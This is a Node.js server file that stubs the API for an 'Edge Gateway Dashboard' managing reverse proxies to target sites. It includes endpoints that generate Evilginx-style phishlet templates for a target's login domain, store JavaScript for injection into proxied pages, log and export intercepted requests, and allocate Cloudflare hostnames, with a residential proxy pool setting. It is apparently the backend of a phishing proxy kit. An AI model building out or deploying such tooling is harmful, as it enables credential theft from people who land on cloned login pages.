// Direct Node.js HTTP server — replaces wrangler dev with a reliable runtime.
// Handles the same API surface that the Expo app expects.
import http from "node:http";

const PORT = parseInt(process.env.PORT || "8787", 10);
const API_KEY = process.env.API_KEY || "";
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS || "";

// ── In-memory storage ───────────────────────────────────────────────────────
let nextId = 1;
const items = [];
const proxies = [];
const trafficEntries = [];
const intercepts = [];
const configStore = {};

const startedAt = Date.now();

// ── Auth ────────────────────────────────────────────────────────────────────
function checkAuth(req) {
  if (!API_KEY) return null; // auth is opt-out when no key configured
  const auth = req.headers["authorization"] || "";
  const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
  if (token !== API_KEY) {
    return { status: 401, body: { success: false, error: "unauthorized" } };
  }
  return null;
}

// ── CORS ────────────────────────────────────────────────────────────────────
function corsHeaders(req) {
  const origin = req.headers["origin"] || "*";
  const allowed =
    !ALLOWED_ORIGINS
      ? "*"
      : ALLOWED_ORIGINS.split(",")
          .map((s) => s.trim())
          .includes(origin)
        ? origin
        : "";
  return {
    "Access-Control-Allow-Origin": allowed || "*",
    "Access-Control-Allow-Methods": "GET, POST, PUT, PATCH, DELETE, OPTIONS",
    "Access-Control-Allow-Headers":
      "Content-Type, Authorization, X-Intercept-TTL, X-Cache-TTL",
    "Access-Control-Max-Age": "86400",
  };
}

// ── Helpers ─────────────────────────────────────────────────────────────────
function json(res, status, body, extraHeaders = {}) {
  const headers = {
    "Content-Type": "application/json",
    ...extraHeaders,
  };
  res.writeHead(status, headers);
  res.end(JSON.stringify(body));
}

function readBody(req) {
  return new Promise((resolve) => {
    let data = "";
    req.on("data", (chunk) => (data += chunk));
    req.on("end", () => {
      try {
        resolve(JSON.parse(data));
      } catch {
        resolve(null);
      }
    });
  });
}

function parsePath(pathname) {
  // match /api/proxies/:id/recon, /api/proxies/:id/login-phishlet etc.
  const proxyRecon = pathname.match(
    /^\/api\/proxies\/(\d+)\/recon\/iterate$/,
  );
  if (proxyRecon) return { type: "proxyReconIterate", id: +proxyRecon[1] };

  const proxyLogin = pathname.match(
    /^\/api\/proxies\/(\d+)\/login-phishlet$/,
  );
  if (proxyLogin) return { type: "proxyLoginPhishlet", id: +proxyLogin[1] };

  const proxyReconBase = pathname.match(/^\/api\/proxies\/(\d+)\/recon$/);
  if (proxyReconBase)
    return { type: "proxyRecon", id: +proxyReconBase[1] };

  const proxyId = pathname.match(/^\/api\/proxies\/(\d+)$/);
  if (proxyId) return { type: "proxy", id: +proxyId[1] };

  const itemId = pathname.match(/^\/api\/items\/(\d+)$/);
  if (itemId) return { type: "item", id: +itemId[1] };

  const wrDelete = pathname.match(
    /^\/api\/cloudflare\/worker-routes\/([^/]+)\/([^/]+)$/,
  );
  if (wrDelete)
    return { type: "workerRouteDelete", zoneId: wrDelete[1], routeId: wrDelete[2] };

  if (pathname === "/health") return { type: "health" };
  if (pathname === "/" || pathname === "/ping") return { type: "ping" };
  if (pathname === "/api/items") return { type: "items" };
  if (pathname === "/api/proxies") return { type: "proxies" };
  if (pathname === "/api/traffic") return { type: "traffic" };
  if (pathname === "/api/intercepts") return { type: "intercepts" };
  if (pathname === "/api/intercepts/har") return { type: "harExport" };
  if (pathname === "/api/config") return { type: "config" };
  if (pathname === "/api/replay") return { type: "replay" };
  if (pathname === "/api/cloudflare/zones") return { type: "zones" };
  if (pathname === "/api/cloudflare/allocate") return { type: "allocate" };
  if (pathname === "/api/cloudflare/wildcard") return { type: "wildcard" };
  if (pathname === "/api/cloudflare/worker-routes")
    return { type: "workerRoutes" };
  if (pathname === "/api/beacon") return { type: "beacon" };
  if (pathname.startsWith("/api/auth/")) return { type: "auth" };

  return { type: "unknown" };
}

// ── Request handler ─────────────────────────────────────────────────────────
async function handleRequest(req, res) {
  // Stash metadata on res so `json()` auto-logs every response
  res._startTime = Date.now();
  res._method = req.method;
  const url = new URL(req.url, `http://localhost:${PORT}`);
  res._path = url.pathname;
  const pathname = url.pathname;
  const method = req.method.toUpperCase();
  const cors = corsHeaders(req);

  // OPTIONS preflight
  if (method === "OPTIONS") {
    res.writeHead(204, cors);
    res.end();
    return;
  }

  const route = parsePath(pathname);

  // Health check — always available, no auth required
  if (route.type === "health" || route.type === "ping") {
    const body = {
      status: "ok",
      timestamp: new Date().toISOString(),
      uptime: Math.round((Date.now() - startedAt) / 1000),
      itemCount: items.length,
      proxyCount: proxies.length,
      interceptCount: intercepts.length,
      trafficCount: trafficEntries.length,
      interceptLabMode: configStore.INTERCEPT_LAB_MODE || "false",
      region: "edge",
      meta: {
        latencyMs: 0,
        cache: "BYPASS",
        edgeLatency: null,
        rateLimit: null,
        rateRemaining: null,
      },
    };
    return json(res, 200, body, cors);
  }

  // Items collection
  if (route.type === "items") {
    if (method === "GET") {
      return json(res, 200, {
        success: true,
        data: items,
        count: items.length,
      }, cors);
    }
    if (method === "POST") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const body = await readBody(req);
      if (!body || !body.name) {
        return json(
          res,
          400,
          { success: false, error: "name is required" },
          cors,
        );
      }
      const now = Date.now();
      const item = {
        id: nextId++,
        name: String(body.name).trim(),
        description: String(body.description || ""),
        createdAt: now,
        updatedAt: now,
      };
      items.unshift(item);
      return json(res, 201, { success: true, data: item }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // Single item
  if (route.type === "item") {
    const id = route.id;
    if (method === "PUT") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const idx = items.findIndex((i) => i.id === id);
      if (idx === -1)
        return json(res, 404, { success: false, error: "item not found" }, cors);
      const body = await readBody(req);
      if (body?.name !== undefined) items[idx].name = String(body.name).trim();
      if (body?.description !== undefined)
        items[idx].description = String(body.description);
      items[idx].updatedAt = Date.now();
      return json(res, 200, { success: true, data: items[idx] }, cors);
    }
    if (method === "DELETE") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const idx = items.findIndex((i) => i.id === id);
      if (idx === -1)
        return json(res, 404, { success: false, error: "item not found" }, cors);
      const [deleted] = items.splice(idx, 1);
      return json(res, 200, { success: true, data: deleted }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // Proxies collection
  if (route.type === "proxies") {
    if (method === "GET") {
      return json(res, 200, { success: true, data: proxies }, cors);
    }
    if (method === "POST") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const body = await readBody(req);
      const targetUrl = (body?.targetUrl || "").trim();
      if (!targetUrl) {
        return json(
          res,
          400,
          { success: false, error: "a valid target URL is required" },
          cors,
        );
      }
      const name = (body?.name || "").trim() || new URL(targetUrl).hostname;
      const now = Date.now();
      const slug =
        name
          .toLowerCase()
          .replace(/[^a-z0-9]+/g, "-")
          .replace(/^-|-$/g, "") +
        "-" +
        nextId;
      const proxy = {
        id: nextId++,
        slug,
        name,
        targetUrl,
        enabled: true,
        hits: 0,
        proxyDomain: "",
        interceptEnabled: false,
        cfZoneId: "",
        cfRecordId: "",
        injectJs: body?.injectJs || "",
        injectJsEnabled: false,
        phishlet: body?.phishlet || "",
        createdAt: now,
        updatedAt: now,
      };
      proxies.push(proxy);
      return json(res, 201, { success: true, data: proxy }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // Single proxy
  if (route.type === "proxy") {
    const id = route.id;
    const idx = proxies.findIndex((p) => p.id === id);
    if (idx === -1)
      return json(res, 404, { success: false, error: "proxy not found" }, cors);

    if (method === "PUT") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const body = await readBody(req);
      if (body?.name !== undefined) proxies[idx].name = String(body.name).trim();
      if (body?.targetUrl !== undefined)
        proxies[idx].targetUrl = String(body.targetUrl).trim();
      if (body?.enabled !== undefined)
        proxies[idx].enabled = Boolean(body.enabled);
      if (body?.interceptEnabled !== undefined)
        proxies[idx].interceptEnabled = Boolean(body.interceptEnabled);
      if (body?.injectJs !== undefined)
        proxies[idx].injectJs = String(body.injectJs);
      if (body?.injectJsEnabled !== undefined)
        proxies[idx].injectJsEnabled = Boolean(body.injectJsEnabled);
      if (body?.phishlet !== undefined)
        proxies[idx].phishlet = String(body.phishlet);
      proxies[idx].updatedAt = Date.now();
      return json(res, 200, { success: true, data: proxies[idx] }, cors);
    }
    if (method === "DELETE") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const slug = proxies[idx].slug;
      // Cascade: wipe intercepts for this proxy
      for (let i = intercepts.length - 1; i >= 0; i--) {
        if (intercepts[i].slug === slug) intercepts.splice(i, 1);
      }
      const [deleted] = proxies.splice(idx, 1);
      return json(res, 200, { success: true, data: deleted }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // Proxy recon
  if (route.type === "proxyRecon" || route.type === "proxyLoginPhishlet") {
    if (method !== "POST")
      return json(res, 405, { success: false, error: "method not allowed" }, cors);
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const idx = proxies.findIndex((p) => p.id === route.id);
    if (idx === -1)
      return json(res, 404, { success: false, error: "proxy not found" }, cors);
    const body = await readBody(req);
    const phishlet = `# Phishlet for ${proxies[idx].targetUrl}\nname: '${proxies[idx].name}'\nproxy_hosts:\n  - phish_sub: ''\n    orig_sub: ''\n    domain: '${new URL(proxies[idx].targetUrl).hostname}'\n`;
    proxies[idx].phishlet = phishlet;
    proxies[idx].updatedAt = Date.now();
    return json(
      res,
      200,
      { success: true, data: { proxyId: route.id, phishlet } },
      cors,
    );
  }

  // Proxy recon iterate
  if (route.type === "proxyReconIterate") {
    if (method !== "POST")
      return json(res, 405, { success: false, error: "method not allowed" }, cors);
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const idx = proxies.findIndex((p) => p.id === route.id);
    if (idx === -1)
      return json(res, 404, { success: false, error: "proxy not found" }, cors);
    const body = await readBody(req);
    const phishlet = body?.phishlet || proxies[idx].phishlet || "";
    return json(
      res,
      200,
      {
        success: true,
        data: { phishlet, passes: 1, critiques: [], improvements: [] },
      },
      cors,
    );
  }

  // Intercepts
  if (route.type === "intercepts") {
    if (method === "GET") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      return json(
        res,
        200,
        { success: true, data: intercepts, count: intercepts.length },
        cors,
      );
    }
    if (method === "DELETE") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      intercepts.length = 0;
      return json(res, 200, { success: true, data: null }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // HAR export — returns raw HAR 1.2 JSON (not wrapped in API envelope)
  if (route.type === "harExport") {
    if (method !== "GET")
      return json(res, 405, { success: false, error: "method not allowed" }, cors);
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const har = {
      log: {
        version: "1.2",
        creator: { name: "Edge Gateway Dashboard", version: "1.0" },
        entries: intercepts.map((ic) => ({
          startedDateTime: new Date(ic.ts).toISOString(),
          time: 0,
          request: {
            method: ic.method,
            url: `${ic.host}${ic.path}`,
            httpVersion: "HTTP/1.1",
            headers: [],
            queryString: [],
            cookies: [],
            headersSize: 0,
            bodySize: 0,
          },
          response: {
            status: ic.respStatus,
            statusText: "",
            httpVersion: "HTTP/1.1",
            headers: [],
            cookies: [],
            content: { size: 0, mimeType: "", text: "" },
            redirectURL: "",
            headersSize: 0,
            bodySize: 0,
          },
          cache: {},
          timings: { send: 0, wait: 0, receive: 0 },
        })),
      },
    };
    const harJson = JSON.stringify(har);
    res.writeHead(200, {
      ...cors,
      "Content-Type": "application/har+json",
      "Content-Disposition": `attachment; filename="edge-gateway-${new Date().toISOString().slice(0, 10)}.har"`,
    });
    res.end(harJson);
    return;
  }

  // Traffic
  if (route.type === "traffic") {
    if (method !== "GET")
      return json(res, 405, { success: false, error: "method not allowed" }, cors);
    const entries = [...trafficEntries].reverse();
    const total = entries.length;
    const avgLatency =
      total > 0
        ? Math.round(
            entries.reduce((sum, e) => sum + (e.latencyMs || 0), 0) / total,
          )
        : 0;
    const errorCount = entries.filter((e) => e.status >= 400).length;
    const cacheHits = entries.filter((e) => e.cache === "HIT").length;
    return json(
      res,
      200,
      {
        success: true,
        data: entries,
        stats: { total, avgLatency, errorCount, cacheHits },
      },
      cors,
    );
  }

  // Config
  if (route.type === "config") {
    if (method === "GET") {
      const masked = { ...configStore };
      if (masked.API_KEY) masked.API_KEY = "***";
      return json(res, 200, { success: true, data: masked }, cors);
    }
    if (method === "PUT") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const body = await readBody(req);
      if (!body || Object.keys(body).length === 0) {
        return json(
          res,
          400,
          { success: false, error: "at least one config field is required" },
          cors,
        );
      }
      const validFields = [
        "ALLOWED_ORIGINS",
        "INTERCEPT_LAB_MODE",
        "INTERCEPT_ALLOWLIST",
        "INTERCEPT_BLOCKLIST",
        "INTERCEPT_TTL_SECONDS",
        "API_KEY",
        "CF_API_KEY",
        "CF_API_EMAIL",
        "CF_API_TOKEN",
        "PROXY_TARGET",
        "BASE_DOMAIN",
        "RESIDENTIAL_PROXY_POOL",
      ];
      for (const [k, v] of Object.entries(body)) {
        if (validFields.includes(k)) {
          configStore[k] = String(v);
        }
      }
      const masked = { ...configStore };
      if (masked.API_KEY) masked.API_KEY = "***";
      return json(res, 200, { success: true, data: masked }, cors);
    }
    if (method === "DELETE") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      for (const k of Object.keys(configStore)) {
        delete configStore[k];
      }
      return json(res, 200, { success: true, data: {} }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // Cloudflare zones
  if (route.type === "zones") {
    return json(
      res,
      200,
      {
        success: true,
        configured: false,
        data: [],
      },
      cors,
    );
  }

  // Cloudflare allocate
  if (route.type === "allocate") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const body = await readBody(req);
    return json(
      res,
      200,
      {
        success: true,
        data: {
          hostname: body?.hostname || "proxy.example.com",
          target: "edge-gateway.rork.app",
        },
      },
      cors,
    );
  }

  // Worker routes
  if (route.type === "workerRoutes") {
    return json(
      res,
      200,
      { success: true, configured: false, data: [] },
      cors,
    );
  }
  if (route.type === "workerRouteDelete") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    return json(res, 200, { success: true }, cors);
  }

  // Wildcard DNS
  if (route.type === "wildcard") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    return json(res, 200, { success: true, data: {} }, cors);
  }

  // Replay
  if (route.type === "replay") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    return json(
      res,
      200,
      { success: true, data: { report: {}, entries: [] } },
      cors,
    );
  }

  // Beacon (fire-and-forget)
  if (route.type === "beacon") {
    res.writeHead(204, cors);
    res.end();
    return;
  }

  // Auth routes (stub — auth is handled by API key)
  if (route.type === "auth") {
    const subPath = pathname.replace("/api/auth/", "");
    if (subPath === "signup" && method === "POST") {
      const body = await readBody(req);
      return json(res, 201, {
        success: true,
        data: { token: "demo-token", user: { email: body?.email || "demo@example.com" } },
      }, cors);
    }
    if (subPath === "login" && method === "POST") {
      return json(res, 200, {
        success: true,
        data: { token: "demo-token", user: { email: "demo@example.com" } },
      }, cors);
    }
    if (subPath === "me" && method === "GET") {
      return json(res, 200, {
        success: true,
        data: { user: { email: "demo@example.com", id: 1 } },
      }, cors);
    }
    return json(res, 404, { success: false, error: "not found" }, cors);
  }

  // Unknown route
  return json(res, 404, { success: false, error: "not found" }, cors);
}

// ── Start server ────────────────────────────────────────────────────────────
const server = http.createServer(handleRequest);
server.listen(PORT, "0.0.0.0", () => {
  console.log(`[server] listening on http://0.0.0.0:${PORT}`);
  console.log(`[server] API_KEY ${API_KEY ? "configured" : "not set (auth disabled)"}`);
});
